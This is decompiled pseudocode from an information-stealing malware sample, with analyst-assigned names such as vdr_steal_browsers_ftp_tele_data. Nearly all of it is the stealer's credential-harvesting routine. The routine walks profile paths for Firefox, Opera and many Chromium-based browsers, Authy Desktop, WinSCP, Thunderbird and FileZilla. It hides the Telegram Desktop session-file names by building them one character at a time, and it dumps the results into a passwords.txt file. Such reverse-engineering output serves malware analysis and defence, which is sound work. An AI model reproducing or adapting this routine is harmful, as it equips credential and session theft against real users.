// #STR: "Opera Crypto Stable", "Opera Crypto", "F8806DD0", "A92DAA6E", "A7FDF864F", "countries", "C461824F*", "A6F891F2*", "BC10B77*", "Telegram"
void *__thiscall vdr_steal_browsers_ftp_tele_data(vdr_steal_credential_t *arg_cred_t, int a2, int a3)
{
  memset(str_saved_creds_data, 0, sizeof(str_saved_creds_data));
  arg_cred_t->field_C = 0;
  arg_cred_t->field_10 = 0;
  arg_cred_t->field_8 = 0;
  arg_cred_t->field_18 = 0;
  arg_cred_t->field_14 = 0;
  arg_cred_t->field_1C = 0;
  vdr_mapping_sql_db_funcs();
  vdr_steal_profiles_ini(str_Mozilla_Firefox, arg_cred_t, str__Mozilla_Firefox_Profiles_, str_saved_creds_data);
  vdr_steal_profiles_ini(str_Pale_Moon, arg_cred_t, str__Moonchild_Productions_Pale_Moon_Profiles_, str_saved_creds_data);
  vdr_steal_data_of_Opera_browser(str_Opera, str_saved_creds_data, arg_cred_t, str__Opera_Stable_, 0);
  vdr_steal_data_of_Opera_browser(str_OperaGX, str_saved_creds_data, arg_cred_t, str__Opera_GX_Stable_, 0);
  vdr_steal_data_of_Opera_browser("Opera Crypto", str_saved_creds_data, arg_cred_t, "Opera Crypto Stable", 1);
  vdr_steal_data_of_browsers_based_chromium(str_Google_Chrome, str_saved_creds_data, arg_cred_t, str__Google_Chrome_User_Data_);// \Google\Chrome\User Data\
                                                // The Encryption Key is stored in the file Local State: %LOCALAPPDATA%\Google\Chrome\User Data\Local State.
  vdr_steal_data_of_browsers_based_chromium(str_Chromium, str_saved_creds_data, arg_cred_t, str__Chromium_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Amigo, str_saved_creds_data, arg_cred_t, str__Amigo_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Torch, str_saved_creds_data, arg_cred_t, str__Torch_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Vivaldi, str_saved_creds_data, arg_cred_t, str__Vivaldi_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Comodo_Dragon, str_saved_creds_data, arg_cred_t, str__Comodo_Dragon_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Epic_Privacy_Browser, str_saved_creds_data, arg_cred_t, str__Epic_Privacy_Browser_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_CocCoc, str_saved_creds_data, arg_cred_t, str__CocCoc_Browser_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Brave_Old, str_saved_creds_data, arg_cred_t, str__brave_);
  vdr_steal_data_of_browsers_based_chromium(str_Cent_Browser, str_saved_creds_data, arg_cred_t, str__CentBrowser_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_7Star, str_saved_creds_data, arg_cred_t, str__7Star_7Star_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_TorBro_Browser, str_saved_creds_data, arg_cred_t, str__TorBro_Profile_);
  vdr_steal_data_of_browsers_based_chromium(str_Chedot_Browser, str_saved_creds_data, arg_cred_t, str__Chedot_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Microsoft_Edge, str_saved_creds_data, arg_cred_t, str__Microsoft_Edge_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_360_Browser, str_saved_creds_data, arg_cred_t, str__360Browser_Browser_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_QQBrowser, str_saved_creds_data, arg_cred_t, str__Tencent_QQBrowser_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_CryptoTab_Browser, str_saved_creds_data, arg_cred_t, str__CryptoTab_Browser_User_Data_);
  vdr_steal_data_of_browsers_based_chromium(str_Brave, str_saved_creds_data, arg_cred_t, str__BraveSoftware_Brave_Browser_User_Data_);
  if ( LOBYTE(arg_cred_t->field_0) )
  {
    vdr_steal_AuthyDesktop_data(arg_cred_t);
    if ( LOBYTE(arg_cred_t->field_0) )
    {
      vdr_steal_WinSCP_data(str_saved_creds_data);
      vdr_steal_profiles_ini(str_Thunderbird, arg_cred_t, str__Thunderbird_Profiles_, str_saved_creds_data);
      vdr_steal_FileZilla_data(str_saved_creds_data);
    }
  }
  if ( BYTE1(arg_cred_t->field_4) )
  {
    memset(str_TelegramDesktop_path, 0, MAX_PATH);
    memset(str_key_datas, 0, MAX_PATH);
    memset(str_D877F783D5D3EF8C, 0, MAX_PATH);
    memset(pstrAPPDATA_path, 0, sizeof(pstrAPPDATA_path));
    dwRes = SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, pstrAPPDATA_path);
    lstrcatA(str_TelegramDesktop_path, (dwRes < 0 ? 0 : pstrAPPDATA_path));
    lstrcatA(str_TelegramDesktop_path, "\\");
    lstrcatA(str_TelegramDesktop_path, "T");
    lstrcatA(str_TelegramDesktop_path, L"e");
    lstrcatA(str_TelegramDesktop_path, L"l");
    lstrcatA(str_TelegramDesktop_path, L"e");
    lstrcatA(str_TelegramDesktop_path, "g");
    lstrcatA(str_TelegramDesktop_path, "r");
    lstrcatA(str_TelegramDesktop_path, L"a");
    lstrcatA(str_TelegramDesktop_path, "m");
    lstrcatA(str_TelegramDesktop_path, " ");
    lstrcatA(str_TelegramDesktop_path, "D");
    lstrcatA(str_TelegramDesktop_path, L"e");
    lstrcatA(str_TelegramDesktop_path, L"s");
    lstrcatA(str_TelegramDesktop_path, "k");
    lstrcatA(str_TelegramDesktop_path, L"t");
    lstrcatA(str_TelegramDesktop_path, "o");
    lstrcatA(str_TelegramDesktop_path, "p");
    lstrcatA(str_TelegramDesktop_path, "\\");
    lstrcatA(str_key_datas, "k");
    lstrcatA(str_key_datas, L"e");
    lstrcatA(str_key_datas, "y");
    lstrcatA(str_key_datas, "_");
    lstrcatA(str_key_datas, "d");
    lstrcatA(str_key_datas, L"a");
    lstrcatA(str_key_datas, L"t");
    lstrcatA(str_key_datas, L"a");
    lstrcatA(str_key_datas, L"s");
    lstrcatA(str_D877F783D5D3EF8C, "D");
    lstrcatA(str_D877F783D5D3EF8C, "8");
    lstrcatA(str_D877F783D5D3EF8C, "7");
    lstrcatA(str_D877F783D5D3EF8C, "7");
    lstrcatA(str_D877F783D5D3EF8C, "F");
    lstrcatA(str_D877F783D5D3EF8C, "7");
    lstrcatA(str_D877F783D5D3EF8C, "8");
    lstrcatA(str_D877F783D5D3EF8C, "3");
    lstrcatA(str_D877F783D5D3EF8C, "D");
    lstrcatA(str_D877F783D5D3EF8C, "5");
    lstrcatA(str_D877F783D5D3EF8C, "D");
    lstrcatA(str_D877F783D5D3EF8C, "3");
    lstrcatA(str_D877F783D5D3EF8C, "E");
    lstrcatA(str_D877F783D5D3EF8C, "F");
    lstrcatA(str_D877F783D5D3EF8C, "8");
    lstrcatA(str_D877F783D5D3EF8C, "C");
    lstrcatA(str_D877F783D5D3EF8C, "*");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, str_key_datas, "Telegram");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, str_D877F783D5D3EF8C, "Telegram");
    Dst._Myres = 0xF;
    Dst._Mysize = 0;
    Dst.u._Buf[0] = 0;
    v5 = strlen("p*");
    std::string::assign(&Dst, "p*", v5);
    v26 = 0;
    v6 = vdr_std_strcpy_wrap("ma", &v19, &Dst);
    LOBYTE(v26) = 1;
    if ( v6->_Myres >= 0x10 )
      v6 = v6->u._Ptr;
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, v6->u._Buf, "Telegram");
    if ( v19._Myres >= 0x10 )
      operator delete(v19.u._Ptr);
    v26 = 0xFFFFFFFF;
    v19._Myres = 0xF;
    v19._Mysize = 0;
    v19.u._Buf[0] = 0;
    if ( Dst._Myres >= 0x10 )
      operator delete(Dst.u._Ptr);
    Dst._Myres = 0xF;
    Dst._Mysize = 0;
    Dst.u._Buf[0] = 0;
    v7 = strlen("BC10B77*");
    std::string::assign(&Dst, "BC10B77*", v7);
    v26 = 2;
    v8 = vdr_std_strcpy_wrap("A7FDF864F", &v19, &Dst);
    LOBYTE(v26) = 3;
    if ( v8->_Myres >= 0x10 )
      v8 = v8->u._Ptr;
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, v8->u._Buf, "Telegram");
    if ( v19._Myres >= 0x10 )
      operator delete(v19.u._Ptr);
    v26 = 0xFFFFFFFF;
    v19._Myres = 0xF;
    v19._Mysize = 0;
    v19.u._Buf[0] = 0;
    if ( Dst._Myres >= 0x10 )
      operator delete(Dst.u._Ptr);
    Dst._Myres = 0xF;
    Dst._Mysize = 0;
    Dst.u._Buf[0] = 0;
    v9 = strlen("A6F891F2*");
    std::string::assign(&Dst, "A6F891F2*", v9);
    v26 = 4;
    v10 = vdr_std_strcpy_wrap("A92DAA6E", &v19, &Dst);
    LOBYTE(v26) = 5;
    if ( v10->_Myres >= 0x10 )
      v10 = v10->u._Ptr;
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, v10->u._Buf, "Telegram");
    if ( v19._Myres >= 0x10 )
      operator delete(v19.u._Ptr);
    v26 = 0xFFFFFFFF;
    v19._Myres = 0xF;
    v19._Mysize = 0;
    v19.u._Buf[0] = 0;
    if ( Dst._Myres >= 0x10 )
      operator delete(Dst.u._Ptr);
    v18._Myres = 0xF;
    v18._Mysize = 0;
    v18.u._Buf[0] = 0;
    v11 = strlen("C461824F*");
    std::string::assign(&v18, "C461824F*", v11);
    v26 = 6;
    v12 = vdr_std_strcpy_wrap("F8806DD0", &v17, &v18);
    LOBYTE(v26) = 7;
    if ( v12->_Myres >= 0x10 )
      v12 = v12->u._Ptr;
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, v12->u._Buf, "Telegram");
    if ( v17._Myres >= 0x10 )
      operator delete(v17.u._Ptr);
    v26 = 0xFFFFFFFF;
    v17._Myres = 0xF;
    v17._Mysize = 0;
    v17.u._Buf[0] = 0;
    if ( v18._Myres >= 0x10 )
      operator delete(v18.u._Ptr);
    v18._Myres = 0xF;
    v18._Mysize = 0;
    v18.u._Buf[0] = 0;
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, "countries", "Telegram");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, "prefix", "Telegram");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, "settingss", "Telegram");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, "shortcuts-custom.json", "Telegram");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, "shortcuts-default.json", "Telegram");
    sub_41DBD0(arg_cred_t, g_var_temp, str_TelegramDesktop_path, "usertag", "Telegram");
  }
  v13 = dword_459338;
  arg_cred_t->field_C = dword_45932C;
  arg_cred_t->field_10 = v13;
  dw_saved_creds_data_len = lstrlenA(str_saved_creds_data);
  v15 = arg_cred_t->field_20;
  if ( v15 )
  {
    if ( *v15 == 2 )
      g_dwCreatedFileMappingObj = vdr_create_file_to_save_data(*(v15 + 4), str_saved_creds_data, str__passwords_txt, dw_saved_creds_data_len, 3);
    else
      g_dwCreatedFileMappingObj = 0x80000;
  }
  else
  {
    g_dwCreatedFileMappingObj = 0x10000;
  }
  return memset(str_saved_creds_data, 0, sizeof(str_saved_creds_data));
}
